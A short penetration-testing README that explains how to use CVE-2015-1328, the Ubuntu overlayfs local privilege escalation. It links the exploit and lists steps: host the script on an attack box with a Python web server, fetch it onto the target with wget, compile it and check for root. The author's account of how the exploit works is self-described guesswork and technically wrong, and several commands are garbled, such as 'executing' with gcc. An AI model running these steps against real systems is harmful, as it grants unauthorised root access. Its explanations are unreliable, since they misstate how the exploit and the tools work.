# CVE-Cheat-Sheet
This is a cheat sheet on how to use some CVEs for penetration testing. Note: don't be retarded and use this on production environments - especially if you don't have permission or have a backup config in case shit hits the fan.

<h1>
  <a href="https://www.exploit-db.com/exploits/37292" title="CVE-2015-1328">CVE-2015-1328</a>
</h1>
<details><summary>Read more</summary>
  <h2>What does this CVE do?</h2>
  <p>"The overlayfs implementation in the linux (aka Linux kernel) package before 3.19.0-21.21 in Ubuntu through 15.04 does not properly check permissions for file creation in the upper filesystem directory, which allows local users to obtain root access by leveraging a configuration in which overlayfs is permitted in an arbitrary mount namespace."</p>
  <p>In other words, the C script abuses an exploit with Linux's <a href="https://en.wikipedia.org/wiki/OverlayFS" title="OverlayFS">OverlayFS</a> feature by creating files in an abritrary location within the `/usr/src/{Linux version}/fs/overlayfs` directory and assigning it with `0777` attributes (aka. `rwxrwxrwx`) to be executed by the Linux kernel (remember: some functions of the kernel are carried out with some system-level privileges). The script gains privilege escalation by using ```gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w```. (What I think anyways) This line spawns a new Process ID, and that PID gets the kernel to compile the C script as the system root. And because there are no checks carried out by the Linux OS, the kernel can complete this action under the assumption as root without any access controls being performed.</p>

  <h2>How to use this CVE:</h2>
  <ol>
    <li>Read the code provided in this CVE. Ensure that it will not kill any system processes to induce a system crash.</li>
    <li>Download the script. Transfer the script onto your Attack Box.</li>
    <li>On your Attack Box, start a simple web server (the easiest method is to use `python3 -m http.server`).</li>
    <li>(Assuming you've already got a connection on the Target System) Grab the script from your web server using `wget {ip}:{port} {script.ext}`. If you run into issues, `cd` into the `/tmp` directory and try again.</li>
    <li>Execute the script using `gcc {script.ext}`.</li>
    <li>Verify if you have root access using `whoami`.</li>
  </ol>

  <h2>Disclaimer</h2>
  <p>This CVE writes files to the affected system. Ensure that the affected party accepts the ability for you to make changes to the system before using this CVE.</p>
</details>
